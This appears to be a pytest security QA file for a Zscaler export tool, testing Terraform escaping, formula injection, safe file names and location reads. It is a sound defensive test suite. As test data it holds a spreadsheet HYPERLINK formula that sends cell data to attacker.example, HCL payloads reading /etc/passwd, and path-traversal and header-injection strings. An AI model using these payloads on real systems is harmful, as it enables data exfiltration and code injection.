"""Cloud wave 6 QA: the exports (pack_terraform, pack_export, policy_exports,
config_exports).

Terraform injection and round trip, export completeness and order, formula
injection in the workbooks, a 10,000-rule tenant, the ZIA policy framework
part, safe download names, and the location reads (pagination, the id in
the request path). Every tenant is a fake; nothing reaches a real one.
Findings: docs/qa/findings/c6-exports.json.
"""
from __future__ import annotations

import io
import json
import re
import tracemalloc
import zipfile
from datetime import datetime, timezone

import pytest

import config_exports as ce
import pack_export as pe
import pack_library as pl
import pack_terraform as pt
import policy_exports as po
from hcl_strict import parse as parse_hcl, string_value
from test_pack_export import _source

NOW = datetime(2026, 1, 2, tzinfo=timezone.utc)
FORMULA = '=HYPERLINK("http://attacker.example/?d="&A1,"Click")'
# Characters a quoted Terraform string must never carry raw: a terminal
# escape, NUL, BEL, the other C0/C1 controls, the Unicode line separators
# and the Arabic letter mark (a bidi control of CVE-2021-42574).
RAW_CONTROLS = ["\x1b", "\x00", "\x07", "\x0b", "\x0c", "\x7f", "\x85", "\x9b", "\u2028", "\u2029", "\u061c"]
# Tenant names that try every way out of an HCL string or comment.
HOSTILE_NAMES = [
    'Web ${file("/etc/passwd")} %{ if true }x%{ endif }',
    "Web <<EOF\nresource \"zia_rule_labels\" \"pwn\" {}\nEOF",
    "Web # hash // slashes /* block */",
    "Web \\u0041 literal \\U0001F600 escape",
    "Web \x1b[31mred\x1b[0m \u202eevil\u202c \u061c mark \u2028 sep",
    'Web "quoted" \\ back',
]


def _snap(n, *, channel="web"):
    """A tenant read (pack_export.read_tenant's shape) with `n` rules on one
    channel, listed in reverse so the export has to put them in order."""
    return {"dictionaries": [{"id": 1, "name": "SSN", "custom": False},
                             {"id": 100, "name": "Codes", "custom": True, "dictionary_type": "PATTERNS_AND_PHRASES",
                              "phrases": [{"action": "PHRASE_COUNT_TYPE_ALL", "phrase": "project code"}]}],
            "engines": [{"id": 5, "name": "Codes Engine", "custom_dlp_engine": True, "engine_expression": "((D100.S > 0) AND (D1.S > 2))"}],
            "rules": {channel: [{"id": i, "name": f"Rule {i:05d}", "order": i, "action": "BLOCK", "state": "ENABLED",
                                 "dlp_engines": [{"id": 5, "name": "Codes Engine"}], "protocols": ["ANY_RULE"]}
                                for i in range(n, 0, -1)]},
            "errors": {}}


def _read_back(pack):
    """The pack as a Terraform workspace, read back by the pack library's reader."""
    _, files = pe.terraform_files(pack, "Jane Doe")
    back, _ = pl.pack_from_terraform({k: v for k, v in files.items() if k.endswith(".tf")})
    return files, back


# ---------------------------------------------------------------------------
# Terraform: injection
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("ch", RAW_CONTROLS, ids=[f"U+{ord(c):04X}" for c in RAW_CONTROLS])
def test_a_quoted_terraform_string_never_carries_a_raw_control_character(ch):
    """ASVS V5.3.1 · OWASP A03:2021 · CWE-150 · CWE-116 · WSTG-INPV-11: a control or bidi character in a tenant name is written as its \\u escape, and reads back unchanged."""
    # Arrange
    name = f"Rule{ch}name"
    # Act
    literal = pt.hcl_str(name)
    # Assert: escaped in the file, the same value for Terraform.
    assert ch not in literal and f"\\u{ord(ch):04x}" in literal
    assert string_value(literal) == name


@pytest.mark.parametrize("ch", RAW_CONTROLS, ids=[f"U+{ord(c):04X}" for c in RAW_CONTROLS])
def test_a_template_string_from_a_json_workspace_never_carries_a_raw_control_character(ch):
    """ASVS V5.3.1 · OWASP A03:2021 · CWE-150 · CWE-116 · WSTG-INPV-11: the vendor-migration workspace escapes controls in its strings too."""
    # Arrange / Act
    literal = pt.hcl_template_str(f"a{ch}b")
    # Assert
    assert ch not in literal and string_value(literal) == f"a{ch}b"


@pytest.mark.parametrize("ch", ["\x1b", "\x00", "\x7f", "\x9b", "\u061c"], ids=["ESC", "NUL", "DEL", "CSI", "ALM"])
def test_a_terraform_comment_never_carries_a_terminal_escape_or_bidi_mark(ch):
    """ASVS V5.3.1 · OWASP A03:2021 · CWE-150 · WSTG-INPV-11: a tenant name in a # comment loses control and bidi characters (they show as U+FFFD)."""
    # Arrange / Act
    text = pt.hcl_comment(f"rule{ch}[2Jname")
    # Assert
    assert ch not in text and text == "rule\ufffd[2Jname"


def test_the_tab_and_ordinary_text_are_left_as_they_are():
    """ASVS V5.3.1 · CWE-116: escaping stops at what is dangerous (boundary: tab, accents, emoji pass through)."""
    assert pt.hcl_str("a\tb é \U0001F600") == '"a\tb é \U0001F600"'
    assert pt.hcl_comment("a\tb é") == "a\tb é"


@pytest.mark.parametrize("name", HOSTILE_NAMES, ids=range(len(HOSTILE_NAMES)))
def test_a_hostile_rule_name_stays_one_inert_string_in_the_exported_workspace(name):
    """ASVS V5.3.1 · OWASP A03:2021 · CWE-94 · CWE-74 · WSTG-INPV-11: interpolation, directives, heredocs, comments, escapes and bidi controls in a name never become HCL."""
    # Arrange
    client = _source()
    client.zia.dlp_web_rules.items[1].name = name
    res = pe.export_pack(client, tenant_label="acme")
    # Act
    _, files = pe.terraform_files(res["pack"], "Jane Doe")
    # Assert: strict HCL, no live template sequence but the generator's own references, no injected block, no raw control.
    for fname, text in files.items():
        if not fname.endswith(".tf"):
            continue
        interps, directives = parse_hcl(text)
        assert not directives and all(re.fullmatch(r"(var\.[a-z_]+|(data\.)?zia_[a-z_]+\.[a-z0-9_]+\.(id|tenant_id))", i) for i in interps)
        assert not re.search(r'^resource "zia_rule_labels"', text, re.M)
        assert not re.search("[\x00-\x08\x0b-\x1f\x7f-\x9f\u2028\u2029\u061c\u202a-\u202e]", text), fname
    names = [string_value(m.group(1)) for m in re.finditer(r'^\s*name\s*=\s*(".*")$', files["rules.tf"], re.M)]
    assert name in names


# ---------------------------------------------------------------------------
# Terraform: round trip (writer -> pack library reader)
# ---------------------------------------------------------------------------

def test_the_writer_and_reader_round_trip_names_text_and_order():
    """ASVS V5.1.4 · CWE-20 · WSTG-BUSL-01: dictionaries, engines and rules read back from the workspace with the same names, patterns, phrases, expressions and order."""
    # Arrange: hostile names everywhere a tenant string lands.
    client = _source()
    for item, name in zip(client.zia.dlp_web_rules.items, HOSTILE_NAMES):
        item.name = name
    client.zia.dlp_dictionary.items[2].name = "Codes ${a} \x07 \\u0041"
    client.zia.dlp_dictionary.items[2].patterns[0].pattern = r'\bPRJ-\d{4}\b ${x} %{y} "q" \u0041'
    pack = pe.export_pack(client, tenant_label="acme")["pack"]
    # Act
    _, back = _read_back(pack)
    # Assert
    assert [p["name"] for p in back["policies"]] == [p["name"] for p in pack["policies"]]
    assert [(d["name"], d.get("patterns") or [], d.get("phrases") or [], d["description"]) for d in back["dictionaries"]] == \
        [(d["name"], d.get("patterns") or [], d.get("phrases") or [], d["description"]) for d in pack["dictionaries"]]
    assert [(e["name"], e["expression"]) for e in back["engines"]] == [(e["name"], e["expression"]) for e in pack["engines"]]
    by_name = {p["name"]: p for p in back["policies"]}
    for p in pack["policies"]:
        assert by_name[p["name"]]["engines"] == p["engines"] and by_name[p["name"]]["channel"] == p["channel"]


def test_the_reader_keeps_labels_notification_template_and_pinned_tenants():
    """ASVS V5.1.4 · CWE-20 · WSTG-BUSL-01: rule labels, the notification template and the SaaS / email tenants survive writer -> reader."""
    # Arrange
    client = _source()
    for r in client.zia.dlp_web_rules.items:
        r.labels, r.notification_template = [{"id": 1, "name": "PCI label"}], {"id": 3, "name": "Notify tpl"}
    pack = pe.export_pack(client, tenant_label="acme")["pack"]
    # Act
    _, back = _read_back(pack)
    # Assert
    got = {p["name"]: p for p in back["policies"]}
    for p in pack["policies"]:
        for k in ("labels", "notification_template", "tenants"):
            assert got[p["name"]].get(k) == p.get(k), (p["name"], k)


# ---------------------------------------------------------------------------
# Large tenants
# ---------------------------------------------------------------------------

def test_a_10k_rule_export_is_complete_in_order_and_skips_the_rate_forecast(monkeypatch):
    """ASVS V11.1.4 · OWASP A04:2021 · CWE-407 · CWE-400 · WSTG-BUSL-05: 10,000 rules export whole, in tenant order, without the quadratic rate forecast."""
    # Arrange: the forecast (O(n^2) in zia_rate) must not run for a workspace.
    import zia_rate

    def no_forecast(*a, **k):
        raise AssertionError("the Terraform workspace computed the rate-limit forecast")
    monkeypatch.setattr(zia_rate, "pack_note", no_forecast)
    snap = _snap(10_000)   # listed in reverse: the read puts the rules in the tenant's order
    snap = pe.read_tenant(_Client(snap["rules"]["web"], snap["dictionaries"], snap["engines"]), channels=("web",))
    pack = pe.build_pack(snap, now=NOW)
    # Act
    _, files = pe.terraform_files(pack, "Jane Doe")
    # Assert
    want = [f"Rule {i:05d}" for i in range(1, 10_001)]
    assert [p["name"] for p in pack["policies"]] == want and pack["meta"]["rule_order"]["web"] == want
    written = re.findall(r'^\s*name\s*=\s*"(Rule \d{5})"$', files["rules.tf"], re.M)
    assert written == want


def test_a_10k_rule_pack_export_stays_within_its_memory_budget():
    """ASVS V11.1.4 · CWE-400 · CWE-770 · WSTG-BUSL-05: building and zipping a 10,000-rule pack peaks under 64 MB."""
    # Arrange
    snap = _snap(10_000)
    tracemalloc.start()
    try:
        # Act
        pack = pe.build_pack(snap, now=NOW)
        _, data = pe.zip_pack(pack)
        peak = tracemalloc.get_traced_memory()[1]
    finally:
        tracemalloc.stop()
    # Assert
    assert peak < 64 * 2 ** 20, f"{peak / 2 ** 20:.1f} MB"
    assert len(json.loads(zipfile.ZipFile(io.BytesIO(data)).read(f"{pe.folder_name(pack)}/configs/dlp_policies.json"))) == 10_000


class _Counted(str):
    """A label that counts how often it is compared (a linear scan compares every label given out)."""
    eq_calls = 0
    __hash__ = str.__hash__

    def __eq__(self, other):
        type(self).eq_calls += 1
        return str.__eq__(self, other)


def test_resource_labels_are_given_out_in_linear_time(monkeypatch):
    """ASVS V11.1.4 · CWE-407 · WSTG-BUSL-05: Slugger checks a label against a set, not every label given out (2,000 names, near-zero comparisons)."""
    # Arrange
    real = pt.slug
    monkeypatch.setattr(pt, "slug", lambda name, prefix="": _Counted(real(name, prefix)))
    _Counted.eq_calls = 0
    s = pt.Slugger()
    # Act
    labels = [s.get("rule", f"Rule {i}") for i in range(2000)]
    # Assert: unique labels, and far fewer comparisons than the 2 million a scan makes.
    assert len(set(labels)) == 2000 and _Counted.eq_calls < 2000


def test_two_names_with_the_same_slug_still_get_distinct_labels():
    """ASVS V5.1.4 · CWE-694: labels stay unique and stable (boundary: names that slug alike, a repeated name)."""
    s = pt.Slugger()
    assert [s.get("rule", n) for n in ("A b", "a-b", "A_B", "A b")] == ["a_b", "a_b_2", "a_b_3", "a_b"]


def test_a_pack_json_that_is_not_an_object_still_generates():
    """ASVS V5.1.4 · CWE-20 · CWE-755: a pack.json holding a list (or broken JSON) falls back to the folder's name."""
    import os
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        d = os.path.join(tmp, "my_pack")
        os.makedirs(d)
        for body, want in (("[1, 2]", "My Pack"), ("{broken", "My Pack"), ('{"name": "Named"}', "Named")):
            with open(os.path.join(d, "pack.json"), "w", encoding="utf-8") as f:
                f.write(body)
            assert pt._pack_meta(d)["name"] == want


# ---------------------------------------------------------------------------
# Export completeness: untrusted numbers from the tenant
# ---------------------------------------------------------------------------

class _Rules:
    def __init__(self, rows):
        self.rows = rows

    def list_rules(self, *a, **k):
        return self.rows, None, None


class _Zia:
    def __init__(self, web, dicts, engines):
        from types import SimpleNamespace
        self.dlp_dictionary = SimpleNamespace(list_dicts=lambda: (dicts, None, None))
        self.dlp_engine = SimpleNamespace(list_dlp_engines=lambda: (engines, None, None))
        self.dlp_web_rules = _Rules(web)


class _Client:
    """The SDK's read surface for Web DLP (list calls answering (rows, resp, err)); no write method exists."""
    def __init__(self, web, dicts=(), engines=()):
        self.zia = _Zia(list(web), list(dicts), list(engines))


@pytest.mark.parametrize("bad", ["3a", [1], float("inf"), {"x": 1}], ids=["text", "list", "inf", "object"])
def test_a_rule_order_that_is_not_a_number_never_ends_the_read(bad):
    """ASVS V5.1.4 · V7.4.1 · CWE-20 · CWE-755 · WSTG-ERRH-01: read_tenant keeps every rule, numbered ones in order, the odd one last."""
    # Arrange
    rows = [{"id": 2, "name": "B", "order": 2}, {"id": 9, "name": "Odd", "order": bad}, {"id": 1, "name": "A", "order": 1},
            {"id": 3, "name": "None", "order": None}]
    # Act
    snap = pe.read_tenant(_Client(rows), channels=("web",))
    # Assert
    assert [r["name"] for r in snap["rules"]["web"]] == ["None", "A", "B", "Odd"] and not snap["errors"]


def test_a_sub_rule_order_or_proximity_that_is_not_a_number_still_exports():
    """ASVS V5.1.4 · CWE-20 · CWE-755 · WSTG-ERRH-01: build_pack takes an odd sub-rule order and an odd proximity without a traceback."""
    # Arrange
    snap = _snap(1, channel="endpoint")
    snap["dictionaries"][1]["proximity"] = "near"
    snap["rules"]["endpoint"][0]["sub_rules"] = [{"id": 7, "name": "Sub x", "order": "first", "dlp_engines": [{"id": 5}]},
                                                 {"id": 8, "name": "Sub y", "order": 1, "dlp_engines": [{"id": 5}]}]
    # Act
    pack = pe.build_pack(snap, now=NOW)
    # Assert
    assert [s["name"] for s in pack["policies"][0]["sub_rules"]] == ["Sub y", "Sub x"]
    assert "proximity" not in pack["dictionaries"][0]


# ---------------------------------------------------------------------------
# The ZIA policy framework part
# ---------------------------------------------------------------------------

FRAMEWORK_LEFT_OUT = [{"name": "Block Gambling", "area": "URL filtering", "field": "scope",
                       "reason": "names groups, locations, users of the source tenant; left out, so the rule applies to everyone where it goes"}]


def _framework(monkeypatch):
    import ops_zia_baseline as zb
    fw = {"format": zb.FRAMEWORK_FORMAT, "format_version": zb.FRAMEWORK_VERSION, "name": "fw", "areas": {"url": [{"name": "Block Gambling"}]},
          "counts": {"url": 1}, "not_exported": list(FRAMEWORK_LEFT_OUT)}
    monkeypatch.setattr(zb, "capture", lambda *a, **k: {"status": "ready", "framework": fw})


def test_a_framework_exported_with_rules_says_what_it_left_out(monkeypatch):
    """ASVS V4.1.3 · V8.3.1 · OWASP A01:2021 · CWE-223 · WSTG-BUSL-01: with DLP rules, pack.json and the result still list the framework's users, groups and locations left out."""
    # Arrange
    _framework(monkeypatch)
    # Act
    res = pe.export_pack(_source(), parts=["rules", "framework"], tenant_label="acme", framework_areas=["url"])
    # Assert
    meta = res["pack"]["meta"]
    framework_rows = [x for x in meta["not_exported"] if x.get("part") == "framework"]
    assert [x["name"] for x in framework_rows] == ["Block Gambling"] and "users" in framework_rows[0]["reason"]
    assert meta["counts"]["not_exported"] == len(meta["not_exported"])
    _, data = pe.zip_pack(res["pack"])
    saved = json.loads(zipfile.ZipFile(io.BytesIO(data)).read(f"{pe.folder_name(res['pack'])}/pack.json"))
    assert any(x.get("part") == "framework" and "locations" in x["reason"] for x in saved["not_exported"])


def test_a_framework_exported_on_its_own_says_what_it_left_out(monkeypatch):
    """ASVS V8.3.1 · CWE-223 · WSTG-BUSL-01: the framework-only export keeps its not_exported list (regression)."""
    _framework(monkeypatch)
    res = pe.export_pack(_source(), parts=["framework"], tenant_label="acme", framework_areas=["url"])
    assert res["status"] == "ready" and res["pack"]["meta"]["not_exported"] == FRAMEWORK_LEFT_OUT


# ---------------------------------------------------------------------------
# Download names
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("name", ["CON", "nul", "Com1", "LPT9", "aux"])
def test_an_export_is_never_named_after_a_windows_device(name):
    """ASVS V12.3.1 · CWE-67 · WSTG-BUSL-08: a pack named CON downloads as con_pack.zip, its folders too, and the parts keep that name."""
    # Arrange
    pack = pe.build_pack(_snap(2), name=name, now=NOW)
    # Act
    fname, data, index = pe.zip_export(pack, "both", "Jane Doe")
    # Assert
    stem = name.lower() + "_pack"
    assert fname == f"{stem}-pack-and-terraform.zip"
    tops = {n.split("/", 1)[0] for n in zipfile.ZipFile(io.BytesIO(data)).namelist()}
    assert tops == {stem, f"{stem}-terraform"} and all(f["path"].split("/", 1)[0] in tops for f in index)
    assert pe.zip_pack(pack)[0] == f"{stem}.zip"


@pytest.mark.parametrize("name", ['../../etc/passwd', 'a"b;\r\nContent-Type: x', "C:\\Windows\\x", "\u202egpj.exe", "名前", "", " "])
def test_every_download_and_zip_member_name_is_safe(name):
    """ASVS V12.3.1 · OWASP A01:2021 · CWE-22 · CWE-113 · WSTG-ATHZ-01: download and member names hold only [a-z0-9_-], one folder deep."""
    # Arrange
    pack = pe.build_pack(_snap(1), name=name, now=NOW)
    # Act
    fname, data, _ = pe.zip_export(pack, "both", "Jane Doe")
    # Assert
    assert re.fullmatch(r"[a-z0-9_]{1,64}(-pack-and-terraform)?\.zip", fname)
    for member in zipfile.ZipFile(io.BytesIO(data)).namelist():
        top, rest = member.split("/", 1)
        assert re.fullmatch(r"[a-z0-9_]{1,64}(-terraform)?", top) and ".." not in rest and "\\" not in member


@pytest.mark.parametrize("label", ["../x", "a\r\nb", "C:\\t", "", "\u202e"])
def test_policy_and_location_export_file_names_are_safe(label):
    """ASVS V12.3.1 · CWE-22 · CWE-113 · WSTG-ATHZ-01: the workbook names carry only [A-Za-z0-9_-] from the tenant label."""
    for name in (po.filename("firewall", label, "xlsx"), po.bundle([("a", b""), ("b", b"")], label, "pdf")[0]):
        assert re.fullmatch(r"[A-Za-z0-9_\-]+\.(xlsx|pdf|zip)", name)


# ---------------------------------------------------------------------------
# Policy exports
# ---------------------------------------------------------------------------

def test_a_policy_rule_with_an_infinite_order_sorts_last_without_a_traceback():
    """ASVS V5.1.4 · CWE-20 · CWE-755 · WSTG-ERRH-01: an order the tenant answered as Infinity sorts last instead of an OverflowError."""
    # Arrange
    raw = [{"id": 1, "name": "Inf", "order": float("inf")}, {"id": 2, "name": "Two", "order": 2}]
    # Act
    out = po.rows("url_filtering", raw, names=po.Names(), index={})
    # Assert
    assert [r[1] for r in out] == ["Two", "Inf"]


# ---------------------------------------------------------------------------
# Location reads and workbooks
# ---------------------------------------------------------------------------

class _LocClient:
    """GET-only fake: every /zia/locations page full of fresh ids (a tenant
    larger than the page cap), sub-locations per parent, no groups."""

    def __init__(self, locations=None, *, endless=False):
        self.calls = []
        self.locations, self.endless = locations or [], endless

    def get(self, endpoint, params=None):
        self.calls.append(endpoint)
        if endpoint == "/zia/locations":
            if self.endless:
                page = params["page"]
                return [{"id": page * 100 + i, "name": f"L{page}-{i}"} for i in range(ce.LOCATION_PAGE_SIZE)], 200
            return self.locations, 200
        if endpoint.endswith("/sublocations"):
            return [{"id": 9999, "name": "Sub"}], 200
        return [], 200


def test_a_location_list_cut_at_the_page_cap_says_so(monkeypatch):
    """ASVS V7.4.1 · OWASP A09:2021 · CWE-392 · WSTG-BUSL-01: when the page cap stops the read, the file and the result say the list is incomplete."""
    # Arrange: 2 pages of 3, and the tenant has more.
    monkeypatch.setattr(ce, "MAX_LOCATION_PAGES", 2)
    monkeypatch.setattr(ce, "LOCATION_PAGE_SIZE", 3)
    client = _LocClient(endless=True)
    # Act
    res = ce.locations_export(client, {"usage": [], "summary": "s"}, tenant_label="acme")
    # Assert
    assert res["status"] == "ready" and res["counts"]["locations"] == 6
    assert "only the first 6" in res["errors"]["locations (incomplete)"]
    assert "only the first 6" in zipfile.ZipFile(io.BytesIO(res["artifact"][2])).read("xl/worksheets/sheet1.xml").decode()


def test_a_location_list_that_ends_on_a_short_page_is_complete(monkeypatch):
    """ASVS V7.4.1 · CWE-392: a list that fits under the cap is not called incomplete (boundary: exactly one short page)."""
    monkeypatch.setattr(ce, "LOCATION_PAGE_SIZE", 3)
    client = _LocClient([{"id": 1, "name": "A"}, {"id": 2, "name": "B"}])
    got = ce.read_locations(client, {"usage": []})
    assert [x["name"] for x in got["locations"]] == ["A", "B"] and not got["errors"]


@pytest.mark.parametrize("bad_id", ["1/../../adminUsers", "../users", "1?x=1", None, "", "١٢"])
def test_a_location_id_that_is_not_a_number_never_reaches_the_request_path(bad_id):
    """ASVS V5.1.3 · OWASP A10:2021 · CWE-22 · CWE-918 · WSTG-INPV-19: sub-locations are read only for a numeric id; another id is named, never sent."""
    # Arrange
    client = _LocClient([{"id": bad_id, "name": "Odd", "childCount": 1}, {"id": 7, "name": "HQ", "childCount": 1}])
    # Act
    got = ce.read_locations(client, {"usage": []})
    # Assert
    assert [c for c in client.calls if c.endswith("/sublocations")] == ["/zia/locations/7/sublocations"]
    assert got["sublocations"] == {"7": [{"id": 9999, "name": "Sub"}]}
    assert "not a number" in got["errors"]["sub-locations of Odd"]


def test_a_child_count_of_infinity_is_read_as_none():
    """ASVS V5.1.4 · CWE-20 · CWE-755 · WSTG-ERRH-01: an Infinity child count neither crashes nor triggers a sub-location read."""
    client = _LocClient([{"id": 1, "name": "A", "childCount": float("inf")}])
    got = ce.read_locations(client, {"usage": []})
    assert got["locations"] and not [c for c in client.calls if c.endswith("/sublocations")]


def _cell_texts(data):
    z = zipfile.ZipFile(io.BytesIO(data))
    out = []
    for n in z.namelist():
        if n.startswith("xl/worksheets/"):
            xml = z.read(n).decode()
            assert "<f>" not in xml and "<f " not in xml, n
            out += re.findall(r"<t[^>]*>([^<]*)</t>", xml)
    return out


def test_tenant_text_in_the_location_and_client_connector_workbooks_is_never_a_formula():
    """ASVS V5.3.10 · OWASP A03:2021 · CWE-1236 · WSTG-INPV-11: names, comments, groups, PAC URLs and settings from the tenant never start a cell as a formula."""
    # Arrange
    loc = {"locations": [{"id": 1, "name": FORMULA, "description": "@SUM(1)", "country": "-2+3", "childCount": 0,
                          "staticLocationGroups": [{"id": 2, "name": FORMULA}]}], "sublocations": {},
           "groups": [{"id": 2, "name": FORMULA, "comments": FORMULA, "locations": [{"id": 1, "name": FORMULA}]}],
           "rules": {"url_filtering": [{"id": 9, "name": FORMULA, "order": 1, "locations": [{"id": 1, "name": FORMULA}]}]}}
    zcc = {"app_profiles": [{"name": FORMULA, "platform": "windows", "pac_url": FORMULA, "groups": [FORMULA], "bypass": {"domains": [FORMULA]},
                             "raw": {"customSetting": FORMULA}}],
           "forwarding_profiles": [{"id": 1, "name": FORMULA, "raw": {"note": FORMULA}}],
           "pac_files": [{"name": FORMULA, "url": FORMULA, "direct_hosts": [FORMULA]}]}
    # Act
    texts = _cell_texts(ce.locations_workbook(loc, {"usage": ["url_filtering"]}, tenant_label=FORMULA))
    texts += _cell_texts(ce.client_connector_workbook(zcc, {"summary": FORMULA}, tenant_label=FORMULA))
    # Assert
    assert any("HYPERLINK" in t for t in texts)
    assert not [t for t in texts if t[:1] in ("=", "@")]


# ---------------------------------------------------------------------------
# Terraform: containment channels (Cloud App Control, File Type, URL, SSL)
# ---------------------------------------------------------------------------

@pytest.fixture
def containment(monkeypatch, tmp_path):
    """A containment pack, with the carve-out off so the writer sees its rules."""
    from test_control_channels import control_pack
    monkeypatch.setenv("DLP_CHECK_CARVED_CHANNELS", "none")
    return control_pack(tmp_path)


def _rewrite_policies(pack, edit):
    import os
    path = os.path.join(pack["dir"], "configs", "dlp_policies.json")
    with open(path, encoding="utf-8") as f:
        policies = json.load(f)
    edit(policies)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(policies, f)


INJECT_DEFAULT = 'ALLOW_") || file("/etc/passwd") != "" || startswith(a, "X'


def test_an_uploaded_cloud_app_default_action_is_quoted_never_spliced_into_the_expression(containment):
    """ASVS V5.3.1 · OWASP A03:2021 · CWE-94 · WSTG-INPV-11: actions_by_verb's '*' value lands in one string literal of the actions expression."""
    # Arrange
    _rewrite_policies(containment, lambda ps: ps[0]["actions_by_verb"].update({"*": INJECT_DEFAULT}))
    # Act
    files = pt.generate(containment, assessor="Jane Doe")
    # Assert: the expression ends with exactly one literal holding the whole value.
    line = next(x for x in files["rules.tf"].splitlines() if "available_actions_without_isolate" in x)
    m = re.search(r'startswith\(a, ("(?:[^"\\]|\\.)*")\)\)\]$', line)
    assert m and string_value(m.group(1)) == INJECT_DEFAULT.upper() + "_"
    parse_hcl(files["rules.tf"])


def test_containment_rules_round_trip_through_the_reader(containment):
    """ASVS V5.1.4 · CWE-20 · WSTG-BUSL-01: Cloud App Control verbs, File Type, URL and SSL settings read back as the pack had them (rank is the workspace's variable)."""
    # Arrange
    src = pt.load_pack(containment)
    # Act
    files = pt.generate(containment, assessor="Jane Doe")
    back, _ = pl.pack_from_terraform({k: v for k, v in files.items() if k.endswith(".tf")})
    # Assert
    assert [p["name"] for p in back["policies"]] == [p["name"] for p in src["policies"]]
    for a, b in zip(src["policies"], back["policies"]):
        assert {k: v for k, v in a.items() if k != "rank"} == {k: b.get(k) for k in a if k != "rank"}   # the writer adds defaults


def test_an_ssl_action_key_outside_the_provider_schema_stays_in_a_one_line_comment(containment):
    """ASVS V5.3.1 · CWE-94 · CWE-117 · WSTG-INPV-11: a pack's unknown SSL action key with a line break never opens a block."""
    # Arrange
    _rewrite_policies(containment, lambda ps: ps[3]["action"].update({'evil\n}\nresource "zia_rule_labels" "pwn" {': "v\n#"}))
    # Act
    files = pt.generate(containment, assessor="Jane Doe")
    # Assert
    parse_hcl(files["rules.tf"])
    assert not re.search(r'^resource "zia_rule_labels"', files["rules.tf"], re.M)
    assert re.search(r"^  # not in the zscaler/zia provider schema .*action\.evil } resource", files["rules.tf"], re.M)


# ---------------------------------------------------------------------------
# Terraform: writing the workspace
# ---------------------------------------------------------------------------

def test_writing_a_workspace_never_follows_a_link_planted_in_the_folder(tmp_path):
    """ASVS V12.3.2 · OWASP A01:2021 · CWE-59 · CWE-367 · WSTG-ATHZ-01: a rules.tf link to a file outside is replaced, the target left untouched."""
    import os
    # Arrange
    out = tmp_path / "ws"
    out.mkdir()
    victim = tmp_path / "victim.txt"
    victim.write_text("keep")
    os.symlink(victim, out / "rules.tf")
    # Act
    pt.write_workspace({"rules.tf": pt.GENERATED_MARK + "\n"}, str(out))
    # Assert
    assert victim.read_text() == "keep" and not (out / "rules.tf").is_symlink()
    assert (out / "rules.tf").read_text() == pt.GENERATED_MARK + "\n"


def test_a_written_workspace_is_owner_only_and_keeps_the_teams_own_files(tmp_path):
    """ASVS V12.3.1 · V8.1.6 · CWE-276 · CWE-732 · WSTG-CONF-09: files are 0600; a stale generated file goes; the team's .tf, tfvars and a link stay."""
    import os
    import stat
    # Arrange
    out = tmp_path / "ws"
    out.mkdir()
    (out / "stale.tf").write_text(pt.GENERATED_MARK + " old\n")
    (out / "team.tf").write_text("# ours\n")
    (out / "terraform.tfvars").write_text("x = 1\n")
    os.symlink(out / "team.tf", out / "linked.tf")
    # Act
    written = pt.write_workspace({"rules.tf": pt.GENERATED_MARK + "\n"}, str(out))
    # Assert
    assert [os.path.basename(p) for p in written] == ["rules.tf"]
    assert stat.S_IMODE(os.stat(out / "rules.tf").st_mode) == 0o600
    assert sorted(os.listdir(out)) == ["linked.tf", "rules.tf", "team.tf", "terraform.tfvars"]


def test_remove_generated_leaves_state_variables_and_links(tmp_path):
    """ASVS V12.3.1 · CWE-59 · WSTG-ATHZ-01: a blocked compile removes only generated files (and named marked ones), never state, tfvars or a link."""
    import os
    # Arrange
    out = tmp_path / "ws"
    out.mkdir()
    (out / "rules.tf").write_text(pt.GENERATED_MARK + "\n")
    (out / "notes.md").write_text("Written by Zscaler Made Easy\n")
    (out / "terraform.tfstate").write_text("{}")
    os.symlink(out / "rules.tf", out / "link.md")
    # Act
    removed = pt.remove_generated(str(out), names=["notes.md", "link.md", "terraform.tfstate"])
    # Assert
    assert sorted(removed) == ["notes.md", "rules.tf"]
    assert sorted(os.listdir(out)) == ["link.md", "terraform.tfstate"]
    assert pt.remove_generated(str(tmp_path / "missing")) == []


# ---------------------------------------------------------------------------
# Terraform: the command line
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("argv,why", [(["--assessor", "  "], "blank"), (["--assessor", "Zscaler Made Easy"], "not the tool"),
                                      (["nope"], "unknown pack")])
def test_the_cli_refuses_a_blank_or_tool_assessor_and_an_unknown_pack(argv, why, monkeypatch):
    """ASVS V5.1.3 · CWE-20 · WSTG-INPV-01: the generator's CLI exits with a sentence, before writing anything."""
    import dlp_importer
    monkeypatch.setattr(dlp_importer, "discover_packs", lambda: [])
    with pytest.raises(SystemExit) as e:
        pt.main(argv)
    assert why in str(e.value)


def test_the_cli_writes_one_workspace_per_pack(monkeypatch, tmp_path, capsys):
    """ASVS V1.14.1 · CWE-1188: `pack_terraform.py <pack> --out` writes that pack's workspace, owner-only, tagged with the assessor."""
    from test_pack_deploy import _engine, _policy, _dict, write_pack
    import dlp_importer
    # Arrange
    pack = write_pack(tmp_path, "alpha", dicts=[_dict("Alpha Dict")], engines=[_engine("Alpha Engine", "(D:Alpha Dict > 0)")],
                      policies=[_policy("Z-Alpha", ["Alpha Engine"])], meta={"name": "Alpha"})
    monkeypatch.setattr(dlp_importer, "discover_packs", lambda: [pack])
    # Act
    rc = pt.main(["alpha", "--out", str(tmp_path / "tf"), "--assessor", "Jane Doe"])
    # Assert
    assert rc == 0 and "alpha:" in capsys.readouterr().out
    assert "[Jane Doe pack alpha]" in (tmp_path / "tf" / "alpha" / "rules.tf").read_text()


# ---------------------------------------------------------------------------
# Client Connector workbook: secrets and people
# ---------------------------------------------------------------------------

# zscaler-sdk-python 1.11.3 zcc/models/manage_pass.py: the Client Connector passwords.
ZCC_PASSWORD_FIELDS = ["exitPass", "logoutPass", "uninstallPass", "zadDisablePass", "zdpDisablePass", "zdxDisablePass",
                       "ziaDisablePass", "zpaDisablePass", "zdSettingsAccessPass"]
CANARY = "canary-pw-7f3a"


@pytest.mark.parametrize("field", ZCC_PASSWORD_FIELDS)
def test_a_client_connector_password_field_is_never_exported(field):
    """ASVS V8.3.4 · V14.3.3 · OWASP A02:2021 · CWE-200 · CWE-312 · WSTG-INFO-05: a ...Pass setting (the SDK's name for ZCC passwords) is left out, at any depth."""
    # Arrange
    raw = {field: CANARY, "nested": {field: CANARY}, "list": [{field: CANARY, "x": 1}]}
    # Act
    lines = ce.settings_lines(raw)
    data = ce.client_connector_workbook({"app_profiles": [{"name": "P", "platform": "windows", "raw": raw}],
